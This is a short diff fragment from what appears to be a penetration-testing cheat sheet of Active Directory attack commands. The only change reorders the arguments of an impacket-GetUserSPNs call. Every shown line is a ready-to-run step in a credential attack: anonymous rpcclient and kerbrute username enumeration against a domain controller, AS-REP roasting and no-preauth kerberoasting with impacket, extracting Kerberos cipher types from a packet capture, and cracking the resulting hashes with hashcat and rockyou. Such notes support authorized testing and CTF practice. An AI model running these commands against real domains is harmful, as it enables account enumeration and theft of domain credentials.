@@ -154,7 +154,7 @@ rpcclient -U "" -N $TARGET -c "enumdomusers" | grep -oP 'user:\[\K[^]]+' | tr '[
 (kerbrute userenum --dc $TARGET -d $DOM /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -t 50 --delay 0 -o $TARGET_userenum.kerbrute &)
 cat *.kerbrute | grep '[+]' | cut -d ':' -f4 | cut -d '@' -f1 | xargs -n1 | tr '[:upper:]' '[:lower:]' | sort -u | tee usernames
 impacket-GetNPUsers -dc-ip $TARGET -dc-host $DC $DOM/ -usersfile usernames
-impacket-GetUserSPNs -dc-ip $TARGET -dc-host $DC $DOM/ -usersfile usernames -no-preauth 'NPUserjjones'
+impacket-GetUserSPNs -dc-ip $TARGET -dc-host $DC $DOM/ -no-preauth 'NPUserjjones' -usersfile usernames
 tshark -r FILE.pcap -V | grep -iE 'cipher:|enctype:' | cut -d ':' -f2 | xargs -n1
 echo '$krb5pa$18$<CNameString>$<realm>$<cipher>' > hashes; hashcat hashes $rockyou
 
